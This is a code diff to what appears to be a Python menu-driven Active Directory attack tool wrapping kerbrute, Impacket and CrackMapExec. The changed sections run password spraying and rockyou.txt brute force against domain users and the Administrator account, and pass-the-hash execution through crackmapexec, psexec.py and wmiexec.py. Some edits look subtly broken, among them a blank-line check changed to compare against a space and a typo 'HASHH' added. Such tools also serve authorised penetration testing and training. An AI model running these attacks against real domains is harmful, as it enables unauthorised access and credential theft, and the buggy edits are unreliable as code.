@@ -263,7 +263,7 @@ def options():
    print('\u2551' + "(4) Re/Set PASSWORD    (14) Check DNS Records (24) DcomExec (34) Rpc Dump       (44) Kerb ASREPRoast (54) CrackMapExec (64) WinRM   " + '\u2551')
    print('\u2551' + "(5) Re/Set NTLM HASH   (15) Check DNS SERVER  (25) PsExec   (35) REGistery      (45) PASSWORD2HASH   (55) PsEcec HASH  (65) Desktop " + '\u2551')
    print('\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap O/S + Skew   (26) SmbExec  (36) Smb Client     (46) Pass the Hash   (56) SmbExec HASH (66)         " + '\u2551')
-   print('\u2551' + "(7) Re/Set DOMAIN SID  (17) Nmap Subdomains   (27) WmiExec  (37) SmbMap SHARE   (47) Pass the Ticket (57) WmiExec HASh (67)         " + '\u2551')
+   print('\u2551' + "(7) Re/Set DOMAIN SID  (17) Nmap Subdomains   (27) WmiExec  (37) SmbMap SHARE   (47) Pass the Ticket (57) WmiExec HASH (67)         " + '\u2551')
    print('\u2551' + "(8) Re/Set SHARE NAME  (18) Nmap Intense TCP  (28) IfMap    (38) SmbMount SHARE (48) Silver Ticket   (58) Gen UserList (68)         " + '\u2551')
    print('\u2551' + "(9) Re/Set IMPERSONATE (19) Nmap Slow & Full  (29) OpDump   (39) Rpc Client     (49) Golden Ticket   (59) User Editor  (69) Autofill" + '\u2551')
    print('\u255A' + ('\u2550')*132 + '\u255D')
@@ -1128,19 +1128,20 @@ while True:
       command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -passwords users.txt -outputfile passwords.txt")
 
       test1 = linecache.getline("passwords.txt", 1)
-      if test1 == "":
-         print("\n[+] Trying all usernames with password " + PAS.rstrip(" ") + "...")
+      if test1 == " ":
+         print("\n[+] Now trying all usernames with password " + PAS.rstrip(" ") + "...")
          command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -password " + PAS.rstrip(" ") + " -outputfile passwords.txt")
 
       test2 = linecache.getline("passwords.txt", 1)
-      if test2 == "":
+      if test2 == " ":
          print("\n[+] Now trying user Administrator with random passwords...")
-         command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -user Administrtor -passwords /usr/share/wordlists/rockyou.txt")
+         command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -user Administrator -passwords /usr/share/wordlists/rockyou.txt -outputfile passwords.txt")
 
       test3 = linecache.getline("passwords.txt", 1)
-      if test3 == "":
+      if test3 == " ":
          print("\n[+] Now trying all users with random passwords...")
          command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -passwords /usr/share/wordlists/rockyou.txt")
+     
       os.remove("passwords.txt")
       prompt()
 
@@ -1456,10 +1457,10 @@ while True:
 
       print("\n[+] Now trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH " + HASH +"...\n")
 
-      if HASH[:1] != ".":
+      if HASH[:1] != "." and HASH[:1] != " " and HASH[:1] != "":
          command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + IMP.rstrip(" ") + " -H " + HASH + " -x 'net user Administrator /domain'")
       else:
-         print("[-] No NTLM HAS was found for user " + IMP.rstrip(" ") + "...")
+         print("[-] No NTLM HASH was found for user " + IMP.rstrip(" ") + "...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1480,7 +1481,7 @@ while True:
       for x in range (0,MAX):
          if US[x].rstrip(" ") == IMP.rstrip(" "): HASH = PA[x].rstrip(" ")
 
-      if HASH[:1] != ".":
+      if HASH[:1] != "." and HASH[:1] != " " and HASH[:1] != "":
          command(PATH + "psexec.py -hashes :" + HASH + " " + IMP.rstrip(" ") + "@" + TIP.rstrip(" "))
       else:
          print("[-] No hash value was found for user " + IMP.rstrip(" ") + "...")
@@ -1531,7 +1532,7 @@ while True:
       if HASH != ".":  
          command(PATH + "wmiexec.py -hashes :" + HASH + " " + IMP.rstrip(" ") + "@" + TIP.rstrip(" "))   
       else:
-         print("[-] No NTLM HASH was found for user " + IMP.rstrip(" ") + "...")
+         print("[-] No NTLM HASHH was found for user " + IMP.rstrip(" ") + "...")
       prompt()     
 
 # ------------------------------------------------------------------------------------- 
